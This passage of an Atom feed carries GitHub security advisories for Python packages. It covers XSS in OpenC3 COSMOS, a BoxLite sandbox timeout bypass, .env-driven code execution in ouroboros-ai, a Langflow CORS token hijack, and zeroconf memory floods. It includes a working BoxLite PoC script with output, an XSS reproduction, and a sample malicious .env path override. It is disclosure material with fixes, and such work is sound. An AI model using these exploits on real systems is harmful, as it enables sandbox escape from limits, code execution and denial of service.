<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-05-29T21:53:23.906Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[openc3] OpenC3 COSMOS is Vulnerable to Self-XSS Through the Command Sender]]></title>
        <id>https://github.com/advisories/GHSA-ffq5-qpvf-xq7x</id>
        <link href="https://github.com/advisories/GHSA-ffq5-qpvf-xq7x"/>
        <updated>2026-05-29T21:46:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Command Sender UI uses an unsafe <code>eval()</code> function on array-like command parameters, which allows a user-supplied payload to execute in the browser when sending a command. This creates a self-XSS risk because an attacker can trigger their own script execution in the victim’s session, if allowed to influence the array parameter input, for example via phishing. If successful, an attacker may read or modify data in the authenticated browser context, including session tokens in local storage.</p>
<h3 id="details">Details</h3>
<p>The unsafe <code>eval()</code>  usage on user-supplied ARRAY parameters happens in <code>convertToValue</code> method in <a href="https://github.com/OpenC3/cosmos/blob/main/openc3-cosmos-init/plugins/packages/openc3-cosmos-tool-cmdsender/src/tools/CommandSender/CommandSender.vue">CommandSender.vue</a></p>
<h3 id="poc">PoC</h3>
<ol>
<li>   Using a drop-down form, choose any command that supports ARRAY parameters,</li>
<li>   Inside square brackets “[…]” place a JavaScript code to be executed</li>
<li>   Send command to CmdTlmServer using dedicated “Send” button </li>
<li>   Observe JavaScript code being executed in the current browser session context</li>
</ol>
<p>Below example uses <code>INST ARYCMD</code> to execute simple JavaScript code snippet <code>alert(“XSS”)</code>.
<img src="https://github.com/user-attachments/assets/6fbdb6c9-616a-4268-bbb8-a8a1044437ad" alt="image" height="356" width="947"></p>
<img src="https://github.com/user-attachments/assets/4df24353-aea0-4aa0-adcf-b7c7e387dc83" alt="image" height="545" width="942">

<h3 id="impact">Impact</h3>
<p>Local JavaScript execution in the user's browser</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenC3/cosmos/security/advisories/GHSA-ffq5-qpvf-xq7x">https://github.com/OpenC3/cosmos/security/advisories/GHSA-ffq5-qpvf-xq7x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42086">https://nvd.nist.gov/vuln/detail/CVE-2026-42086</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/openc3/PYSEC-2026-105.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/openc3/PYSEC-2026-105.yaml</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/openc3/CVE-2026-42086.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/openc3/CVE-2026-42086.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-ffq5-qpvf-xq7x">https://github.com/advisories/GHSA-ffq5-qpvf-xq7x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ffq5-qpvf-xq7x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-22T22:22:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[boxlite] BoxLite has a Timeout Bypass Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-xjhv-pp2r-6f82</id>
        <link href="https://github.com/advisories/GHSA-xjhv-pp2r-6f82"/>
        <updated>2026-05-29T21:45:57.000Z</updated>
        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
<p>BoxLite is a sandbox service that allows users to create lightweight virtual machines (Boxes) and run OCI containers within them. BoxLite allows users to configure a timeout for services running inside the virtual machine. When the timeout is triggered, BoxLite sends a signal to kill the process. However, instead of using the uncatchable SIGKILL signal, BoxLite uses the catchable SIGALRM signal. Malicious code running inside the sandbox can exploit this vulnerability to continue running after the timeout is triggered, leading to resource exhaustion within the virtual machine and affecting the availability of the BoxLite service.</p>
<h4 id="details">Details</h4>
<ol>
<li>ExecRequest with timeout_ms arrives at Execution service</li>
</ol>
<p><strong>File:</strong> <code>guest/src/service/exec/mod.rs</code> <strong>Function:</strong> <code>spawn_execution()</code> (line 315) <strong>Code:</strong></p>
<pre><code class="language-rust">// Step 3: Start timeout watcher (if requested)
if req.timeout_ms &gt; 0 {
    timeout::start_timeout_watcher(
        state,
        execution_id.clone(),
        std::time::Duration::from_millis(req.timeout_ms),
    );
}
</code></pre>
<p><strong>Issue:</strong> Any nonzero <code>timeout_ms</code> triggers the timeout watcher. The host expects this to kill the process after the specified duration.</p>
<ol start="2">
<li>Timeout watcher sends SIGALRM instead of SIGKILL</li>
</ol>
<p><strong>File:</strong> <code>guest/src/service/exec/timeout.rs</code> <strong>Function:</strong> <code>start_timeout_watcher()</code> (line 13) <strong>Code:</strong></p>
<pre><code class="language-rust">pub(super) fn start_timeout_watcher(
    exec_state: ExecutionState,
    exec_id: String,
    timeout: Duration,
) {
    tokio::spawn(async move {
        tokio::time::sleep(timeout).await;

        // Kill process with SIGKILL        ← comment says SIGKILL
        use nix::sys::signal::Signal;
        if exec_state.kill(Signal::SIGALRM).await {   // ← but sends SIGALRM
            info!(execution_id = %exec_id, "killed on timeout");
        }
    });
}
</code></pre>
<p><strong>Issue:</strong> The comment on line 21 explicitly states "Kill process with SIGKILL", but line 23 sends <code>Signal::SIGALRM</code>. SIGALRM (signal 14) is the POSIX alarm signal and is catchable/ignorable; SIGKILL (signal 9) cannot be caught or ignored. This is a code error — wrong signal constant used.</p>
<ol start="3">
<li>exec_state.kill() passes the signal through unchanged</li>
</ol>
<p><strong>File:</strong> <code>guest/src/service/exec/state.rs</code> <strong>Function:</strong> <code>kill()</code> (line 325) <strong>Code:</strong></p>
<pre><code class="language-rust">pub async fn kill(&amp;self, signal: nix::sys::signal::Signal) -&gt; bool {
    let inner = self.inner.lock().await;
    if let Some(ref handle) = inner.handle {
        handle.kill(signal).is_ok()
    } else {
        false
    }
}
</code></pre>
<p><strong>Issue:</strong> No override of the signal — the wrong signal (<code>SIGALRM</code>) is delivered directly to the process.</p>
<ol start="4">
<li>ExecHandle.kill() delivers SIGALRM to the process</li>
</ol>
<p><strong>File:</strong> <code>guest/src/service/exec/exec_handle.rs</code> <strong>Function:</strong> <code>kill()</code> (line 335) <strong>Code:</strong></p>
<pre><code class="language-rust">pub fn kill(&amp;self, signal: Signal) -&gt; BoxliteResult&lt;()&gt; {
    use nix::sys::signal::kill;
    kill(self.pid, signal).map_err(|e| {
        BoxliteError::Internal(format!(
            "Failed to send signal {} to process {}: {}",
            signal, self.pid, e
        ))
    })
}
</code></pre>
<p><strong>Issue:</strong> Sends SIGALRM (signal 14) to the process. Any process that has registered a custom SIGALRM handler (e.g., via <code>signal(SIGALRM, handler)</code>) or set SIGALRM to SIG_IGN will not be terminated.</p>
<p>As seen from the code, the developer indicated in the comments that SIGKILL should be sent to kill the timed-out process, but SIGALRM was used in the implementation, resulting in the vulnerability.</p>
<h4 id="poc">PoC</h4>
<ol>
<li><p>Install Boxlite following the official tutorial.</p>
</li>
<li><p>Run the following Python script:</p>
<pre><code class="language-python">#!/usr/bin/env python3
"""
PoC: BoxLite Execution Timeout Bypass via SIGALRM

Reproduces the vulnerability described in:
  "Hunt Report: Exec Timeout Enforcement Bypass via SIGALRM Misuse"

Root cause:
  guest/src/service/exec/timeout.rs sends Signal::SIGALRM (signal 14,
  catchable/ignorable) instead of Signal::SIGKILL (signal 9, uncatchable).

Exploitation:
  Any process that calls signal(SIGALRM, SIG_IGN) will survive past its
  configured timeout and run indefinitely.

Usage:
  cd ~/Downloads/boxlite_poc
  source .venv/bin/activate
  python3 poc_sigalrm_bypass.py
"""

import asyncio
import time

import boxlite

# -----------------------------------------------------------------------------
# Test programs (Python, so no gcc required)
# -----------------------------------------------------------------------------

# Control: no special signal handling — SIGALRM's default action is termination
NORMAL_PROCESS = """
import sys, time, os, signal
seconds = int(sys.argv[1]) if len(sys.argv) &gt; 1 else 8
print(f"PID {os.getpid()}: normal process (default SIGALRM), running for {seconds}s", flush=True)
for i in range(1, seconds + 1):
    time.sleep(1)
    print(f"PID {os.getpid()}: t+{i}s alive", flush=True)
print(f"PID {os.getpid()}: finished", flush=True)
"""

# Exploit: installs SIG_IGN for SIGALRM — one line bypass
IGNORE_SIGALRM = """
import sys, time, os, signal
seconds = int(sys.argv[1]) if len(sys.argv) &gt; 1 else 8
signal.signal(signal.SIGALRM, signal.SIG_IGN)   # &lt;-- bypass
print(f"PID {os.getpid()}: SIGALRM=SIG_IGN, running for {seconds}s", flush=True)
for i in range(1, seconds + 1):
    time.sleep(1)
    if i &gt; 3:
        print(f"PID {os.getpid()}: t+{i}s STILL ALIVE (PAST 3s TIMEOUT!)", flush=True)
    else:
        print(f"PID {os.getpid()}: t+{i}s alive", flush=True)
print(f"PID {os.getpid()}: WORKLOAD COMPLETE - TIMEOUT WAS BYPASSED", flush=True)
"""

TIMEOUT_S = 3.0   # configured timeout
WORKLOAD_S = 8    # process wants to run for 8 seconds


# -----------------------------------------------------------------------------
# Helper
# -----------------------------------------------------------------------------

async def run_test(box, name, script, timeout):
    print(f"\n{'=' * 70}")
    print(f"TEST: {name}")
    print(f"  timeout={timeout}s" if timeout else "  timeout=None (disabled)")
    print(f"{'=' * 70}")
    t0 = time.time()
    try:
        result = await box.exec("python3", "-c", script, str(WORKLOAD_S), timeout=timeout)
        elapsed = time.time() - t0
        print(f"  [RESULT] exit_code={result.exit_code}, elapsed={elapsed:.2f}s")
        print("  [OUTPUT]")
        for line in result.stdout.strip().splitlines():
            if line.strip():
                print(f"    {line}")
        return {
            "elapsed": elapsed,
            "exit_code": result.exit_code,
            "timed_out": False,
            "stdout": result.stdout,
        }
    except boxlite.TimeoutError as e:
        elapsed = time.time() - t0
        print(f"  [TIMEOUT] BoxLite raised TimeoutError after {elapsed:.2f}s: {e}")
        return {"elapsed": elapsed, "exit_code": None, "timed_out": True, "stdout": ""}
    except Exception as e:
        elapsed = time.time() - t0
        print(f"  [ERROR] {type(e).__name__}: {e} (elapsed {elapsed:.2f}s)")
        return {"elapsed": elapsed, "exit_code": None, "timed_out": False, "stdout": ""}


# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------

async def main():
    print("BoxLite PoC: Execution Timeout Bypass via SIGALRM")
    print("=" * 70)

    async with boxlite.SimpleBox(image="python:3-alpine") as box:
        print(f"Box started: {box.id}")

        # Confirm SIGALRM = 14 inside the container
        r = await box.exec("python3", "-c", "import signal; print(signal.SIGALRM)")
        print(f"SIGALRM value inside container: {r.stdout.strip()}")

        # --- Test 1: CONTROL ---
        r1 = await run_test(
            box,
            "CONTROL: Normal process + 3s timeout (default SIGALRM=terminate)",
            NORMAL_PROCESS,
            TIMEOUT_S,
        )
        await asyncio.sleep(1)

        # --- Test 2: EXPLOIT ---
        r2 = await run_test(
            box,
            "EXPLOIT: SIGALRM=SIG_IGN + 3s timeout (BYPASS)",
            IGNORE_SIGALRM,
            TIMEOUT_S,
        )
        await asyncio.sleep(1)

        # --- Test 3: BASELINE ---
        r3 = await run_test(
            box,
            "BASELINE: Normal process, no timeout (sanity check)",
            NORMAL_PROCESS,
            None,
        )

        # --- Verdict ---
        print(f"\n{'=' * 70}")
        print("VERDICT")
        print(f"{'=' * 70}")
        print(f"  CONTROL:  elapsed={r1['elapsed']:.2f}s  exit_code={r1['exit_code']}  timed_out={r1['timed_out']}")
        print(f"  EXPLOIT:  elapsed={r2['elapsed']:.2f}s  exit_code={r2['exit_code']}  timed_out={r2['timed_out']}")
        print(f"  BASELINE: elapsed={r3['elapsed']:.2f}s  exit_code={r3['exit_code']}  timed_out={r3['timed_out']}")

        # exit_code == -14 means killed by signal 14 (SIGALRM), not -9 (SIGKILL)
        control_killed_by_sigalrm = r1["exit_code"] == -14 and r1["elapsed"] &lt; 5.0
        exploit_survived          = r2["elapsed"] &gt; 5.0 and r2["exit_code"] == 0

        print()
        if control_killed_by_sigalrm:
            print("  [+] Control process killed by signal 14 (SIGALRM), not signal 9 (SIGKILL)")
            print("      → confirms timeout watcher sends SIGALRM instead of SIGKILL")
        if exploit_survived:
            print(f"  [+] Exploit process ran {r2['elapsed']:.1f}s past {TIMEOUT_S}s timeout, exited normally")
            print("      → SIGALRM was absorbed by SIG_IGN, timeout completely bypassed")

        if exploit_survived and control_killed_by_sigalrm:
            print()
            print("  *** VULNERABILITY CONFIRMED ***")
            print(f"  Fix: change Signal::SIGALRM → Signal::SIGKILL in")
            print(f"       guest/src/service/exec/timeout.rs")
        elif not exploit_survived:
            print("  NOT CONFIRMED: exploit process was also terminated at timeout")
        else:
            print("  INCONCLUSIVE")


if __name__ == "__main__":
    asyncio.run(main())
</code></pre>
<p>Sample output:</p>
<pre><code>$ python3 poc_sigalrm_bypass.py
BoxLite PoC: Execution Timeout Bypass via SIGALRM
======================================================================
Box started: W0oCKYIWga2t
SIGALRM value inside container: 14

======================================================================
TEST: CONTROL: Normal process + 3s timeout (default SIGALRM=terminate)
  timeout=3.0s
======================================================================
  [RESULT] exit_code=-14, elapsed=3.01s
  [OUTPUT]
    PID 3: normal process (default SIGALRM), running for 8s
    PID 3: t+1s alive
    PID 3: t+2s alive

======================================================================
TEST: EXPLOIT: SIGALRM=SIG_IGN + 3s timeout (BYPASS)
  timeout=3.0s
======================================================================
  [RESULT] exit_code=0, elapsed=8.14s
  [OUTPUT]
    PID 4: SIGALRM=SIG_IGN, running for 8s
    PID 4: t+1s alive
    PID 4: t+2s alive
    PID 4: t+3s alive
    PID 4: t+4s STILL ALIVE (PAST 3s TIMEOUT!)
    PID 4: t+5s STILL ALIVE (PAST 3s TIMEOUT!)
    PID 4: t+6s STILL ALIVE (PAST 3s TIMEOUT!)
    PID 4: t+7s STILL ALIVE (PAST 3s TIMEOUT!)
    PID 4: t+8s STILL ALIVE (PAST 3s TIMEOUT!)
    PID 4: WORKLOAD COMPLETE - TIMEOUT WAS BYPASSED

======================================================================
TEST: BASELINE: Normal process, no timeout (sanity check)
  timeout=None (disabled)
======================================================================
  [RESULT] exit_code=0, elapsed=8.09s
  [OUTPUT]
    PID 5: normal process (default SIGALRM), running for 8s
    PID 5: t+1s alive
    PID 5: t+2s alive
    PID 5: t+3s alive
    PID 5: t+4s alive
    PID 5: t+5s alive
    PID 5: t+6s alive
    PID 5: t+7s alive
    PID 5: t+8s alive
    PID 5: finished

======================================================================
VERDICT
======================================================================
  CONTROL:  elapsed=3.01s  exit_code=-14  timed_out=False
  EXPLOIT:  elapsed=8.14s  exit_code=0  timed_out=False
  BASELINE: elapsed=8.09s  exit_code=0  timed_out=False

  [+] Control process killed by signal 14 (SIGALRM), not signal 9 (SIGKILL)
      → confirms timeout watcher sends SIGALRM instead of SIGKILL
  [+] Exploit process ran 8.1s past 3.0s timeout, exited normally
      → SIGALRM was absorbed by SIG_IGN, timeout completely bypassed

  *** VULNERABILITY CONFIRMED ***
  Fix: change Signal::SIGALRM → Signal::SIGKILL in
       guest/src/service/exec/timeout.rs
</code></pre>
<p>As shown in the output, after catching the SIGALRM signal, the process can continue running, bypassing the timeout restriction.</p>
</li>
</ol>
<h4 id="impact">Impact</h4>
<p>Malicious code running inside the sandbox can exploit this vulnerability to continue running after the timeout is triggered, leading to resource exhaustion within the virtual machine and affecting the availability of the BoxLite service.</p>
<h4 id="score">Score</h4>
<p>Severity: Medium, Score: 6.5, rationale as follows:</p>
<ul>
<li>AV:N — Can be triggered by submitting code via the network API</li>
<li>AC:L — No complex exploitation required; catching the signal is sufficient to bypass</li>
<li>PR:L — The attacker does not need special privileges</li>
<li>UI:N — The attacker does not need to interact with the victim</li>
<li>S:U — This vulnerability only affects the sandbox internals and does not change the scope</li>
<li>C:N/I:N/A:H — This vulnerability only affects availability, not confidentiality or integrity</li>
</ul>
<h4 id="credit">Credit</h4>
<p>This vulnerability was discovered by:</p>
<ul>
<li>XlabAI Team of Tencent Xuanwu Lab</li>
<li>Atuin Automated Vulnerability Discovery Engine</li>
</ul>
<p>CVE and credit are preferred.</p>
<p>If there are any questions regarding the vulnerability details, please feel free to reach out to Tencent Xuanwu Lab for further discussion by emailing <a href="mailto:xlabai@tencent.com">xlabai@tencent.com</a>.</p>
<h4 id="note">Note</h4>
<p>Note that the organization follows the industry-standard <strong>90+30 disclosure policy</strong> (Reference: <a href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html">https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html</a>). This means that the organization reserves the right to disclose the details of the vulnerability 30 days after the fix has been implemented.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-xjhv-pp2r-6f82">https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-xjhv-pp2r-6f82</a></li>
<li><a href="https://github.com/advisories/GHSA-xjhv-pp2r-6f82">https://github.com/advisories/GHSA-xjhv-pp2r-6f82</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xjhv-pp2r-6f82</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T21:45:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ouroboros-ai] ouroboros-ai Vulnerable to Remote Code Execution via Untrusted Project-Directory .env]]></title>
        <id>https://github.com/advisories/GHSA-c4m7-2gwp-vw76</id>
        <link href="https://github.com/advisories/GHSA-c4m7-2gwp-vw76"/>
        <updated>2026-05-29T21:22:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Remote Code Execution (RCE) vulnerability was discovered in Ouroboros. If a user clones a malicious repository and runs Ouroboros commands within that directory, it can lead to arbitrary code execution and potential system takeover.</p>
<p>The vulnerability (CWE-426: Untrusted Search Path &amp; CWE-15: External Control of System Setting) stems from Ouroboros loading the <code>.env</code> file from the current working directory. Prior to the patch, execution-affecting environment variables such as <code>OUROBOROS_CLI_PATH</code>, <code>OPENCODE_CLI_PATH</code>, and other backend selectors were accepted directly from this local <code>.env</code>. An attacker could include a malicious script in the repository and point the CLI path variable to it (e.g., <code>OUROBOROS_CLI_PATH=./malicious_script.sh</code>). When the user executes a command like <code>ouroboros init</code> or any command that instantiates the adapter, the malicious script is executed instead of the intended CLI.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in version 0.39.0 via PR #1078.
The fix establishes a strict trust boundary by applying a denylist to project-local <code>.env</code> loading. It blocks execution-affecting environment variables (such as runtime selectors and CLI path overrides) from being loaded from the project directory. Explicit constructor overrides and trusted user-owned home configurations (<code>~/.ouroboros/.env</code>) remain fully functional. </p>
<p>Users are strongly advised to upgrade to version 0.39.0 or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not immediately possible, users must carefully inspect any <code>.env</code> file inside cloned repositories before running Ouroboros commands to ensure it does not contain unexpected <code>OUROBOROS_*_CLI_PATH</code> or <code>OPENCODE_CLI_PATH</code> overrides.</p>
<h3 id="references">References</h3>
<ul>
<li>GitHub PR: <a href="https://github.com/Q00/ouroboros/pull/1078">https://github.com/Q00/ouroboros/pull/1078</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/Q00/ouroboros/security/advisories/GHSA-c4m7-2gwp-vw76">https://github.com/Q00/ouroboros/security/advisories/GHSA-c4m7-2gwp-vw76</a></li>
<li><a href="https://github.com/Q00/ouroboros/pull/1078">https://github.com/Q00/ouroboros/pull/1078</a></li>
<li><a href="https://github.com/Q00/ouroboros/commit/4e70b760b4eb157469b58645339ba831f6513d37">https://github.com/Q00/ouroboros/commit/4e70b760b4eb157469b58645339ba831f6513d37</a></li>
<li><a href="https://github.com/advisories/GHSA-c4m7-2gwp-vw76">https://github.com/advisories/GHSA-c4m7-2gwp-vw76</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c4m7-2gwp-vw76</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-29T21:22:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Langflow CORS misconfiguration enables Account Takeover and RCE]]></title>
        <id>https://github.com/advisories/GHSA-577h-p2hh-v4mv</id>
        <link href="https://github.com/advisories/GHSA-577h-p2hh-v4mv"/>
        <updated>2026-05-29T20:51:09.000Z</updated>
        <content type="html"><![CDATA[<p>Langflow versions up to and including 1.6.9 contain a chained vulnerability that enables account takeover and remote code execution. An overly permissive CORS configuration (allow_origins='*' with allow_credentials=True) combined with a refresh token cookie configured as SameSite=None allows a malicious webpage to perform cross-origin requests that include credentials and successfully call the refresh endpoint. An attacker-controlled origin can therefore obtain fresh access_token / refresh_token pairs for a victim session. Obtained tokens permit access to authenticated endpoints — including built-in code-execution functionality — allowing the attacker to execute arbitrary code and achieve full system compromise.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-34291">https://nvd.nist.gov/vuln/detail/CVE-2025-34291</a></li>
<li><a href="https://github.com/langflow-ai/langflow">https://github.com/langflow-ai/langflow</a></li>
<li><a href="https://www.obsidiansecurity.com/blog/cve-2025-34291-critical-account-takeover-and-rce-vulnerability-in-the-langflow-ai-agent-workflow-platform">https://www.obsidiansecurity.com/blog/cve-2025-34291-critical-account-takeover-and-rce-vulnerability-in-the-langflow-ai-agent-workflow-platform</a></li>
<li><a href="https://www.vulncheck.com/advisories/langflow-cors-misconfiguration-to-token-hijack-and-rce">https://www.vulncheck.com/advisories/langflow-cors-misconfiguration-to-token-hijack-and-rce</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/10139">https://github.com/langflow-ai/langflow/pull/10139</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/10696">https://github.com/langflow-ai/langflow/pull/10696</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/9240">https://github.com/langflow-ai/langflow/pull/9240</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/9441">https://github.com/langflow-ai/langflow/pull/9441</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/langflow/PYSEC-2025-78.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/langflow/PYSEC-2025-78.yaml</a></li>
<li><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-34291">https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-34291</a></li>
<li><a href="https://www.crowdsec.net/vulntracking-report/cve-2025-34291">https://www.crowdsec.net/vulntracking-report/cve-2025-34291</a></li>
<li><a href="https://github.com/advisories/GHSA-577h-p2hh-v4mv">https://github.com/advisories/GHSA-577h-p2hh-v4mv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-577h-p2hh-v4mv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-12-06T00:31:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zeroconf] zeroconf has unbounded DNS record cache that allows LAN-local memory exhaustion via multicast flood]]></title>
        <id>https://github.com/advisories/GHSA-rfg2-pjw2-56x2</id>
        <link href="https://github.com/advisories/GHSA-rfg2-pjw2-56x2"/>
        <updated>2026-05-29T20:18:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>DNSCache._async_add</code> inserted every response record into <code>cache</code>, <code>_expirations</code>, <code>_expire_heap</code>, and <code>service_cache</code> with no cap on entry count. The only pre-existing protection was a PTR TTL floor (<code>_DNS_PTR_MIN_TTL = 1125</code> s, RFC 6762 §10), which actually <em>prolonged</em> attacker-injected records, and a periodic <code>async_expire</code> on <code>_CACHE_CLEANUP_INTERVAL = 10</code> s that could not keep up with a flood.</p>
<p>Any unauthenticated host on the local link (UDP/5353, <code>224.0.0.251</code> / <code>ff02::fb</code>) can multicast valid mDNS responses with unique names (RFC 6762 §11 allows up to 253 bytes each) and watch them accumulate. On memory-constrained deployments (Home Assistant on Raspberry-Pi-class hardware is the canonical victim) sustained traffic OOM-kills the process; under lighter load, every cache lookup and every periodic expiry pass grows linearly slower, starving asyncio and breaking unrelated zeroconf consumers (discovery, registration, ServiceBrowser callbacks). A second variant — re-multicasting cached records with shifting TTLs — grows <code>_expire_heap</code> unbounded between cleanup runs without touching <code>cache</code> or <code>_total_records</code>.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <code>zeroconf</code> 0.149.6 (<a href="https://github.com/python-zeroconf/python-zeroconf/pull/1718">PR #1718</a>). Upgrade to <code>&gt;= 0.149.6</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no in-process workaround; upgrading is the fix. Otherwise, restrict mDNS (UDP/5353) to trusted Layer-2 segments via AP client isolation, guest-network separation, or host firewall rules.</p>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/pull/1718">PR #1718</a>, fix</li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/issues/1715">Issue #1715</a>, public tracking issue</li>
<li><a href="https://www.rfc-editor.org/rfc/rfc6762#section-10">RFC 6762 §10</a>, <a href="https://www.rfc-editor.org/rfc/rfc6762#section-11">RFC 6762 §11</a>, <a href="https://cwe.mitre.org/data/definitions/400.html">CWE-400</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/security/advisories/GHSA-rfg2-pjw2-56x2">https://github.com/python-zeroconf/python-zeroconf/security/advisories/GHSA-rfg2-pjw2-56x2</a></li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/issues/1715">https://github.com/python-zeroconf/python-zeroconf/issues/1715</a></li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/pull/1718">https://github.com/python-zeroconf/python-zeroconf/pull/1718</a></li>
<li><a href="https://github.com/advisories/GHSA-rfg2-pjw2-56x2">https://github.com/advisories/GHSA-rfg2-pjw2-56x2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rfg2-pjw2-56x2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T20:18:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zeroconf] zeroconf: Unbounded exception-dedup state retains packet buffers via traceback frame locals, enabling LAN-local memory exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-phvx-9mgw-67r5</id>
        <link href="https://github.com/advisories/GHSA-phvx-9mgw-67r5"/>
        <updated>2026-05-29T20:13:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>DNSIncoming._log_exception_debug</code> and the four <code>QuietLogger</code> exception-dedup methods stored an unbounded <code>_seen_logs</code> dict keyed by <code>str(sys.exc_info()[1])</code>. The seven <code>IncomingDecodeError</code> messages raised from <code>_read_name</code> / <code>_decode_labels_at_offset</code> (RFC 6762 §18 name-decoding error paths) all embed <code>self.source</code> — the peer's ephemeral source port, varying per packet — plus byte <code>offset</code> and pointer <code>link</code>, so every attacker-influenced combination produced a fresh dedup key. The stored value was the full <code>sys.exc_info()</code> triple, whose traceback's frame locals retained <code>self.data</code> (the raw inbound packet, up to 8966 bytes per RFC 6762 §17). Each unique malformed packet therefore pinned ~9 KB until process exit.</p>
<p>Any unauthenticated host on the local link (UDP/5353, <code>224.0.0.251</code> / <code>ff02::fb</code>) can drive memory growth at line rate; that includes a guest on the same Wi-Fi, a compromised IoT device, or a container on a shared bridge. On memory-constrained deployments (Home Assistant on Raspberry-Pi-class hardware is the canonical victim) sustained traffic trivially OOM-kills the process, and mDNS-dependent features (HomeKit, Chromecast/Matter, AirPlay, printers) degrade or fail.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <code>zeroconf</code> 0.149.6 (<a href="https://github.com/python-zeroconf/python-zeroconf/pull/1717">PR #1717</a>). Upgrade to <code>&gt;= 0.149.6</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no in-process workaround; upgrading is the fix. Otherwise, restrict mDNS (UDP/5353) to trusted Layer-2 segments via AP client isolation, guest-network separation, or host firewall rules.</p>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/pull/1717">PR #1717</a>, fix</li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/issues/1714">Issue #1714</a>, public tracking issue</li>
<li><a href="https://www.rfc-editor.org/rfc/rfc6762#section-17">RFC 6762 §17</a>, <a href="https://www.rfc-editor.org/rfc/rfc6762#section-18">RFC 6762 §18</a>, <a href="https://cwe.mitre.org/data/definitions/400.html">CWE-400</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/security/advisories/GHSA-phvx-9mgw-67r5">https://github.com/python-zeroconf/python-zeroconf/security/advisories/GHSA-phvx-9mgw-67r5</a></li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/issues/1714">https://github.com/python-zeroconf/python-zeroconf/issues/1714</a></li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/pull/1717">https://github.com/python-zeroconf/python-zeroconf/pull/1717</a></li>
